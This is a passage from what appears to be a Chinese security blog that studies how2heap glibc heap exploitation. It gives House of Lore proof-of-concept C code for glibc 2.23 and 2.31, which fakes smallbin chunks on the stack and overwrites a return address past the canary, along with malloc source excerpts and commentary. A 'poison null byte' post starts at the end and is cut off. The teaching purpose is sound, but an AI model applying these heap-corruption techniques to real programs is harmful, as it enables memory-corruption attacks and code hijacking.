class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);<br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);<br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 = malloc(0x100)\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,<br>         stack_buffer_2[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="hljs-comment">// this chunk will be allocated on stack</span><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>  <span class="hljs-type">long</span> offset = (<span class="hljs-type">long</span>)__builtin_frame_address(<span class="hljs-number">0</span>) - (<span class="hljs-type">long</span>)p4;<br>  <span class="hljs-built_in">memcpy</span>((p4+offset+<span class="hljs-number">8</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>  <span class="hljs-comment">// sanity check</span><br>  <span class="hljs-built_in">assert</span>((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先是构造堆栈布局，<code>free(victim)</code>之前的堆栈布局如图所示<br><img src="https://i.imgur.com/JQTAhBH.png"><br>然后<code>free(victim)</code>并且malloc一个比较大的块后，victim会被放到smallbin中，如图所示。<br><img src="https://i.imgur.com/ZAyB1yN.png"><br>此时的堆栈布局如图所示<br><img src="https://i.imgur.com/TCrBKGI.png"><br><code>victim[1] = (intptr_t)stack_buffer_1;</code>后，堆栈布局如图所示<br><img src="https://i.imgur.com/taGNV38.png"></p><p>malloc中对于smallbin链表的检查是这样的</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xl">      [...]<br><br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-function"><span class="hljs-title">bck</span> = victim-&gt;</span>bk;<br><span class="hljs-function"><span class="hljs-title">if</span> (__glibc_unlikely (bck-&gt;</span>fd != victim))<br>            &#123;<br>              errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>              goto errout;<br>            &#125;<br>          set_inuse_bit_at_offset (victim, nb);<br>          <span class="hljs-function"><span class="hljs-title">bin</span>-&gt;</span>bk = bck;<br>          <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = bin;<br><br>          [...]<br></code></pre></td></tr></table></figure><p>也就是说将victim从bins中取出来的时候，会检查buffer_1的fd是否指向victim，在取出buffer_1的时候，会检查buffer_2的fd是否指向buffer_1，这也就是为什么要伪造两个buffer。</p><p>因此，p4就相当于在buffer_1处申请了一个堆块，此时就能在栈上覆盖返回地址。</p><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><p>2.31和2.23不同的是tcachebin的存在</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span><br><span class="hljs-comment">This PoC take care also of the glibc hardening of smallbin corruption.</span><br><span class="hljs-comment">[ ... ]</span><br><span class="hljs-comment">else</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">      bck = victim-&gt;bk;</span><br><span class="hljs-comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="hljs-comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="hljs-comment">                  goto errout;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="hljs-comment">       bin-&gt;bk = bck;</span><br><span class="hljs-comment">       bck-&gt;fd = bin;</span><br><span class="hljs-comment">       [ ... ]</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span></span>&#123;<br><br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">void</span>* fake_freelist[<span class="hljs-number">7</span>][<span class="hljs-number">4</span>];<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWelcome to the House of Lore\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);<br>  <span class="hljs-type">void</span> *dummies[<span class="hljs-number">7</span>];<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) dummies[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span><br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_1);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_2);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Create a fake free-list on the stack\n&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++) &#123;<br>    fake_freelist[i][<span class="hljs-number">3</span>] = fake_freelist[i+<span class="hljs-number">1</span>];<br>  &#125;<br>  fake_freelist[<span class="hljs-number">6</span>][<span class="hljs-number">3</span>] = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Create a fake chunk on the stack\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span><br>         <span class="hljs-string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span><br>         <span class="hljs-string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span><br>         <span class="hljs-string">&quot;chunk on stack&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span><br>          <span class="hljs-string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);<br>  stack_buffer_2[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span> *)fake_freelist[<span class="hljs-number">0</span>];<br>  <br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span><br>         <span class="hljs-string">&quot;the small one during the free()\n&quot;</span>);<br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);<br><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing dummy chunk\n&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">free</span>(dummies[i]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);<br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br><br>  <span class="hljs-comment">//------------------------------------</span><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);<br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);<br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 = malloc(0x100)\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,<br>         stack_buffer_2[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="hljs-comment">// this chunk will be allocated on stack</span><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br><br>  <span class="hljs-type">long</span> offset = (<span class="hljs-type">long</span>)__builtin_frame_address(<span class="hljs-number">0</span>) - (<span class="hljs-type">long</span>)p4;<br>  <span class="hljs-built_in">memcpy</span>((p4+offset+<span class="hljs-number">8</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>  <span class="hljs-comment">// sanity check</span><br>  <span class="hljs-built_in">assert</span>((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到程序大部分和2.23一样，只不过加入了dummies和fake_freelist数组，dummies数组的作用很明显，是为了填满tcachebin以在free(victim)的时候可以将victim放到smallbin中。因为tcachebin的存在，申请p3时会先从tcachebin中取出空闲块，为了避免这样，需要先将tcachebin中的空闲块取出来，这也就是为什么要<code>for(int i=0; i&lt;7; i++) malloc(0x100);</code>，此时申请的p3就是原victim的地址，当从smallbin里申请一个堆块的时候，会把剩下的smallbin也链入相对应大小的tcache，前提是相应大小的tcache没满。</p><p>其对应的源码如下，我们可以看到，将smallbin中的最后一个chunk取出来后，会检查smallbins中是否还有chunk以及对应的tcache链是否还有空余，有的话就就放到tcache中（while循环），我们可以看到，这里并没有检查bck-&gt;fd&#x3D;&#x3D;tc_victim，因此这也就是为什么fake_freelist只需要指定bk就可以。提一下为什么程序中声明的时fake_freelist[7]而不是fake_freelist[1]或者fake_freelist[2]，我个人的理解是必须至少有一个块没有从samllbin中放入tcache中，因为可能存在一些链表的完整性检查，我们无法准确指定最后一个chunk的bk指向表头，因此smallbins中要至少留一个fake_list。因为stack_buffer_1和stack_buffer_2都进入了tcache，因此fake_freelist的数量至少要大于等于6，所以fake_freelist[6]也是可以的。在上面2.23版本中我们还需要指定stack_buffer_2[2]也就是stack_buffer_2的fd指向stack_buffer_1是因为将stack_buffer_1从smallbins中取出的时候要过<code>bck-&gt;fd != victim</code>的检查，而在这段程序中取出victim的时候（注意程序中的victim和glibc中的victim指的不是一个东西），stack_buffer_1和stack_buffer_2都被放入了tcache中，因此也不必指定stack_buffer_2[2]也就是fd指向stack_buffer_1。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-function"><span class="hljs-title">bck</span> = victim-&gt;</span>bk;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (__glibc_unlikely (bck-&gt;</span>fd != victim))<br>      malloc_printerr (<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>          set_inuse_bit_at_offset (victim, nb);<br>          <span class="hljs-function"><span class="hljs-title">bin</span>-&gt;</span>bk = bck;<br>          <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = bin;<br><br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>      set_non_main_arena (victim);<br>          check_malloced_chunk (av, victim, nb);<br>#<span class="hljs-keyword">if</span> USE_TCACHE<br>    <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">       stash them in the tcache.  */</span><br>    size_t tc_idx = csize2tidx (nb);<br>    <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br>        mchunkptr tc_victim;<br><br>        <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>        <span class="hljs-function"><span class="hljs-title">while</span> (tcache-&gt;</span>counts[tc_idx] &lt; mp_.tcache_count<br>         &amp;&amp; (tc_victim = last (bin)) != bin)<br>    &#123;<span class="hljs-comment">// 如果smallbin里相对应大小的tcache没满的话，就链入tcache</span><br>      <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-function"><span class="hljs-title">bck</span> = tc_victim-&gt;</span>bk;<br>          set_inuse_bit_at_offset (tc_victim, nb);<br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>      set_non_main_arena (tc_victim);<br>          <span class="hljs-function"><span class="hljs-title">bin</span>-&gt;</span>bk = bck;<br>          <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = bin;<br><br>          tcache_put (tc_victim, tc_idx);<br>              &#125;<br>    &#125;<br>      &#125;<br>#endif<br>          void *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          return p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>how2heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>poison null byte</title>
    <link href="/2022/06/30/poison-null-byte/"/>
    <url>/2022/06/30/poison-null-byte/</url>
    
    <content type="html"><![CDATA[<h1 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison null byte"></a>poison null byte</h1><p>本篇主要介绍一下跟着<a href="https://github.com/shellphish/how2heap">how2heap</a>和<a href="https://tttang.com/archive/1614/">cru5h</a>学习poison null byte的过程和一点思考，如有错误欢迎指正。</p><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>这里以<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/poison_null_byte.c">how2heap</a>的例子来学习。</p><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><span class="hljs-type">uint8_t</span>* a;<br><span class="hljs-type">uint8_t</span>* b;<br><span class="hljs-type">uint8_t</span>* c;<br><span class="hljs-type">uint8_t</span>* b1;<br><span 